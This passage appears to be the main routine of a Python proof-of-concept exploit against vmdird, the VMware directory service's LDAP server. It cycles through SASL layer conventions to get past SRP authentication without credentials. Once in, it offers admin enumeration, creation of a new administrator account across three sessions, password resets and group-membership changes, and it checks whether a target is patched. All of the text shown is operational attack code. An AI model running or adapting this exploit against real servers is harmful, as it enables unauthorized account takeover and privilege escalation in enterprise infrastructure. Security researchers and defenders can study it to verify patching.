    a = p.parse_args()

    if a.analyze:
        return analyze_capture(a.analyze)
    if a.capture:
        cap_start(a.capture)
    if a.self_test:
        return self_test()
    if not a.target:
        p.error("provide -t (or use --self-test)")
    if (a.create_admin or a.reset_pass) and not a.new_pass:
        p.error("--create-admin/--reset-pass require --new-pass")

    port = a.port or (636 if a.tls else 389)
    print(f"[+] {a.target}:{port} tls={a.tls} identity={a.identity}")

    ver = target_version(a.target)
    if ver:
        print(f"[+] {ver.get('fullName')} build {ver.get('build')}")

    if a.mac == "auto" and a.seq is None:
        # most likely first: the cyrus-sasl format, then the others
        layers = [("cipher", 0, bool(a.pad)), ("plain", 0, bool(a.pad)),
                  ("cipher", 0, not a.pad), ("cipher", 1, bool(a.pad))]
    else:
        layers = [(a.mac if a.mac != "auto" else "cipher", a.seq or 0,
                    bool(a.pad))]
    # the ack shape is the strongest hypothesis: vary it last, cleartext first
    acks = [a.ack] if a.ack else ["empty", "m2", "wrapped", "wrapped-m2"]
    combos = [(m, s, p, k) for k in acks for (m, s, p) in layers]

    conn = None
    info = {}
    base = a.base or BASE_DEFAULT
    last_err = ""
    for mac, seq, pad, ack in combos:
        try:
            c = Ldap(a.target, port, use_tls=a.tls)
        except ConnectionRefusedError:
            print(f"[-] {a.target}:{port} refused the connection "
                  f"(vmdird may not listen on this interface/port)")
            return 1
        except (socket.timeout, TimeoutError):
            print(f"[-] timeout connecting to {a.target}:{port} (firewall?)")
            return 1
        except ssl.SSLError as exc:
            print(f"[-] TLS failure on {a.target}:{port}: {exc}")
            return 1
        except OSError as exc:
            print(f"[-] network error on {a.target}:{port}: {exc}")
            return 1

        c.debug = a.debug
        cap_write({"ev": "session", "target": a.target, "port": port,
                   "mac": mac, "seq": seq, "pad": int(pad), "ack": ack})
        print("[*] pre-check before authentication (rootDSE)")
        try:
            probe_pre_auth(c)
        except (OSError, ValueError, ConnectionError) as exc:
            print(f"    rootDSE unavailable ({exc}) -- continuing")

        print(f"[*] SRP bypass (layer mac={mac} seq0={seq} pad={int(pad)} "
              f"ack={ack})...")
        try:
            ok, msg, info = srp_bypass(c, a.identity, mac_variant=mac, seq_base=seq,
                                       ack_mode=ack, pad=pad,
                                       seq_auto=not a.no_seq_auto, mac_in=a.mac_in)
        except (ConnectionError, OSError, ValueError) as exc:
            ok, msg, info = False, f"transport dropped during the bind: {exc}", {}
        print(f"[{'+' if ok else '-'}] {msg}")
        if not ok:
            c.close()
            last_err = msg
            if "challenge not received" in msg or "verifier" in msg:
                print("    hint: confirm the identity exists (--identity),")
                print("    try --port 636 --tls and repeat with --debug to see the traffic")
                return 1
            if "PATCHED" in msg:
                print("    target has the A mod N validation: no bypass this way")
                return 1
            print("    trying another convention...")
            continue

        # If there is an action to run, it consumes the single PDU that
        # vmdird accepts per session; then we do not spend it on rootDSE.
        if a.enum or a.create_admin or a.reset_pass or a.group_add:
            conn = c
            base = a.base or BASE_DEFAULT
            print(f"    base DN: {base} (default; no prior search: 1 PDU/session)")
            break

        # one wrapped operation proves the layer convention
        try:
            ncs = discover_base(c)
        except (OSError, ValueError, ConnectionError) as exc:
            last_err = f"{type(exc).__name__}: {exc}"
            # vmdird signs the records it sends with a convention that does
            # not follow cyrus-sasl (see the limitation in the docstring). If
            # the PDU decrypted and only the MAC diverged, the bind and the
            # layer worked; there is nothing to retry with another outbound
            # convention.
            if isinstance(exc, ValueError) and "MAC mismatch" in str(exc):
                print("    [i] bind OK and AES layer active; the MAC of the")
                print("        server records does not match the cyrus-sasl")
                print("        convention (observed limitation, not a bypass")
                print("        failure)")
                print("[+] LDAP session authenticated without credentials (read-only)")
                return 0
            c.close()
            if "inactive" in info.get("layer", ""):
                print(f"[-] server requires a layer and none was negotiated: {last_err}")
                break
            print(f"[-] layer rejected ({last_err}) -- trying another convention")
            continue
        conn = c
        base = a.base or (ncs[0] if ncs else BASE_DEFAULT)
        print(f"    base DN: {base}")
        break

    if conn is None:
        print("[-] no layer convention was accepted by the server")
        if last_err:
            print(f"    last error: {last_err}")
        print("    repeat with --debug, or pin the convention with --mac cipher|plain")
        print("    --seq 0|1, --pad 0|1 and --ack empty|m2|wrapped|wrapped-m2")
        return 1

    try:

        if a.check or not (a.enum or a.create_admin or a.reset_pass
                           or a.group_add):
            print("[+] LDAP session authenticated without credentials (read-only)")
            return 0
        if a.enum:
            print("[*] enumerating (a single broad search)")
            try:
                enumerate_admins(conn, base)
            except (ConnectionError, OSError, ValueError) as exc:
                print(f"[-] the session dropped during the search: {exc}")
                return 1
        if a.create_admin:
            user = a.new_user or ("poc" + secrets.token_hex(3))
            print(f"[*] creating account {user} (add, 1 PDU)")
            if not create_admin(conn, base, user, a.new_pass):
                return 1

            def _new_session(label):
                cn = Ldap(a.target, port, use_tls=a.tls)
                okn, msgn, _ = srp_bypass(cn, a.identity, mac_variant=mac,
                                          seq_base=seq, ack_mode=ack, pad=pad,
                                          seq_auto=not a.no_seq_auto,
                                          mac_in=a.mac_in, log=lambda *_: None)
                if not okn:
                    cn.close()
                    raise RuntimeError(f"{label}: {msgn}")
                return cn

            print("[*] 2nd session: userPassword already stored; UPN missing")
            print("    (the same value is refused by add with code=21 and accepted by modify)")
            try:
                c2 = _new_session("2nd session")
            except RuntimeError as exc:
                print(f"[-] {exc}")
                return 1
            try:
                set_upn(c2, base, user)
            finally:
                c2.close()

            group = (a.group_dn or GROUP_DEFAULT).format(base=base)
            dn = user_dn(user, base)
            print(f"[*] 3rd session: {dn} -> {group}")
            try:
                c3 = _new_session("3rd session")
            except RuntimeError as exc:
                print(f"[-] {exc}")
                return 1
            try:
                add_group_member(c3, group, dn)
            finally:
                c3.close()
            print(f"[+] account ready: {user}@{UPN_DOMAIN} (password set by --new-pass)")
        if a.reset_pass:
            print(f"[*] resetting password of {a.reset_pass}")
            reset_password(conn, base, a.reset_pass, a.new_pass)
        if a.group_add:
            group = (a.group_dn or GROUP_DEFAULT).format(base=base)
            dn = user_dn(a.group_add, base)
            print(f"[*] 2nd session: {dn} -> {group}")
            c2 = Ldap(a.target, port, use_tls=a.tls)
            try:
                ok2, msg2, _ = srp_bypass(c2, a.identity, mac_variant=mac,
                                          seq_base=seq, ack_mode=ack, pad=pad,
                                          seq_auto=not a.no_seq_auto,
                                          mac_in=a.mac_in)
                if not ok2:
                    print(f"[-] 2nd session failed: {msg2}")
                    return 1
                add_group_member(c2, group, dn)
            finally:
                c2.close()
        return 0
    finally:
        conn.close()


def _run() -> int:
    try:
        return main()
    finally:
        cap_stop()


if __name__ == "__main__":
    sys.exit(_run())
